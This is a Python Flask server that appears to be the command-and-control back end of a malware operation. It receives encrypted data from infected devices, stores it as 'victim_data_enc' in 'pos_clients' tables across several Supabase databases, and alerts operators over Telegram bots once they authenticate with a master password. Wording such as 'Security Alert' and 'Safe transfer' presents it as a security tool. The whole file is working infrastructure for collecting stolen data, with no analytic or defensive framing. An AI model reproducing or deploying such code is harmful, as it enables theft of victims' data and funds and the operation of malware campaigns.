import os
import sys
import json
import base64
import logging
import requests
from flask import Flask, request, jsonify

current_dir = os.path.dirname(os.path.abspath(__file__))
parent_dir = os.path.dirname(current_dir)
sys.path.append(parent_dir)

from core.security_shield import SecurityShield
from supabase import create_client

logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

app = Flask(__name__)

MASTER_PASSWORD = os.environ.get('MASTER_PASSWORD')
master_secret_b64 = os.environ.get('MASTER_SECRET_B64')
salt = os.environ.get('SALT')

if not all([MASTER_PASSWORD, master_secret_b64, salt]):
    logger.error("CRITICAL: Security keys are missing in Environment Variables!")
    raise ValueError("Missing essential security configuration.")

master_secret = base64.b64decode(master_secret_b64)
shield = SecurityShield(master_secret, salt.encode())

authenticated_admins = set()

def send_to_all_supabase(decrypted_dict, device_id):
    payload = {
        "client_serial": device_id,
        "ip_address": request.remote_addr,
        "victim_data_enc": json.dumps(decrypted_dict),
        "operational_status": "online",
        "last_seen": "now()"
    }
    for i in range(1, 5):
        url = os.environ.get(f'SUPABASE_URL_{i}')
        key = os.environ.get(f'SUPABASE_KEY_{i}')
        if url and key:
            try:
                client = create_client(url, key)
                client.table('pos_clients').upsert(payload, on_conflict='client_serial').execute()
                logger.info(f"Safe transfer to Supabase {i} completed.")
            except Exception as e:
                logger.error(f"Supabase {i} connection failed.")

def notify_admins(message):
    for i in range(1, 11):
        token = os.environ.get(f'TELEGRAM_TOKEN_{i}')
        if token:
            for admin_id in authenticated_admins:
                try:
                    url = f"https://api.telegram.org/bot{token}/sendMessage"
                    requests.post(url, json={'chat_id': admin_id, 'text': message}, timeout=5)
                except:
                    continue

@app.route('/telegram/webhook', methods=['POST'])
def telegram_webhook():
    update = request.get_json()
    if "message" in update:
        chat_id = update["message"]["chat"]["id"]
        text = update["message"].get("text", "")
        if text == MASTER_PASSWORD:
            authenticated_admins.add(chat_id)
            return jsonify({"status": "authorized"}), 200
    return jsonify({"status": "denied"}), 403

@app.route('/api/v1/collect', methods=['POST'])
def collect_data():
    try:
        data = request.get_json()
        device_id = data.get('device_id')
        encrypted_payload = data.get('payload')
        decrypted_dict = shield.process_incoming_data(encrypted_payload, device_id)
        send_to_all_supabase(decrypted_dict, device_id)
        msg = f"🛡️ Security Alert: New Device Linked\n📱 Model: {decrypted_dict.get('model', 'Unknown')}\n🆔 UUID: {device_id}"
        notify_admins(msg)
        return jsonify({"status": "success"}), 200
    except Exception as e:
        logger.error(f"Inbound processing failed: {e}")
        return jsonify({"error": "integrity_check_failed"}), 500

@app.route('/health', methods=['GET'])
def health():
    return jsonify({"status": "protected"}), 200

if __name__ == '__main__':
    port = int(os.environ.get('PORT', 5000))
    app.run(host='0.0.0.0', port=port)
